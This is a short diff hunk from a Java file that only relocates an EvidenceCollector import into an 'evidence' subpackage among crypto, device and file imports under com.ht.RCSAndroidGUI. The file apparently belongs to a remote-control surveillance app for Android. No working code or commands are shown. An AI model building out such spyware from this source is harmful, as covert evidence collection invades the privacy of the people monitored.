@@ -16,12 +16,12 @@ import java.util.Vector;
 
 import com.ht.RCSAndroidGUI.Debug;
 import com.ht.RCSAndroidGUI.Device;
-import com.ht.RCSAndroidGUI.EvidenceCollector;
 import com.ht.RCSAndroidGUI.Status;
 import com.ht.RCSAndroidGUI.crypto.CryptoException;
 import com.ht.RCSAndroidGUI.crypto.EncryptionPKCS5;
 import com.ht.RCSAndroidGUI.crypto.Keys;
 import com.ht.RCSAndroidGUI.crypto.SHA1Digest;
+import com.ht.RCSAndroidGUI.evidence.EvidenceCollector;
 import com.ht.RCSAndroidGUI.file.AutoFile;
 import com.ht.RCSAndroidGUI.file.Directory;
 import com.ht.RCSAndroidGUI.file.Path;
